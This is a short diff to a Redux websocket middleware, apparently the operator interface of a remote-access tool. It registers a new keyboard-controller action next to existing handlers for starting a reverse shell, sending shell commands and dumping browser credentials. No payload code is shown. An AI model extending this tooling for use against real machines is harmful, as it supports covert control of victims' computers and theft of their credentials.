@@ -18,7 +18,7 @@ import {
     handleStopStreaming,
     handleMonitors,
     handleKey,
-    handleStartReverseShell, handleSendCommandReverseShell, handleDumpBrowser
+    handleStartReverseShell, handleSendCommandReverseShell, handleDumpBrowser, handleKeyboardController
 } from '@redux/middleware/actionHandlers';
 import {handleWebSocketBinary, handleWebSocketMessage} from './messageHandler';
 import {SELECT_CLIENT, WS_CONNECT} from "@redux/actions/connectionActions";
@@ -38,6 +38,7 @@ import {
 } from "@redux/actions/screenManagerActions";
 import {REVERSE_SHELL_COMMAND, START_REVERSE_SHELL} from "@redux/actions/reverseShellActions";
 import {DUMP_BROWSER} from "@redux/actions/credentialsActions";
+import {KEYBOARD_CONTROLLER} from "@redux/actions/keyboardControllerActions";
 
 let websocket = null;
 
@@ -72,6 +73,7 @@ const actionHandlers = {
     [START_REVERSE_SHELL]: (store, action) => handleStartReverseShell(websocket, store, action),
     [REVERSE_SHELL_COMMAND]: (store, action) => handleSendCommandReverseShell(websocket, store, action),
     [DUMP_BROWSER]: (store, action) => handleDumpBrowser(websocket, store, action),
+    [KEYBOARD_CONTROLLER]: (store, action) => handleKeyboardController(websocket, store, action),
 };
 
 const websocketMiddleware = store => next => action => {
